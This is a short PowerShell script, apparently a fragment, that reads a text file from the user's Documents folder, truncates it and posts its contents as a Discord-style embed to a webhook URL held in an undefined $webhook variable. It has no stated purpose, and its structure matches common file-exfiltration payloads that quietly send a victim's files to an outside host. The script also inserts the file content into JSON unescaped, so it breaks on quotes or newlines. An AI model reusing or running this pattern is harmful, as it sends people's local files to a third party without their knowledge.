$filePath = "$env:USERPROFILE\Documents\Testy.txt"

# Read and truncate the file content if necessary
try {
    $fileContent = Get-Content $filePath -Raw
    if ($fileContent.Length -gt 2000) {
        $fileContent = $fileContent.Substring(0, 2000) + "..."
    }

    $body = @"
{
    "embeds": [
        {
            "title": "File Content",
            "description": "$fileContent",
            "color": 552583
        }
    ]
}
"@

Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json"
}
catch {
    Write-Host $_.Exception.Message
}
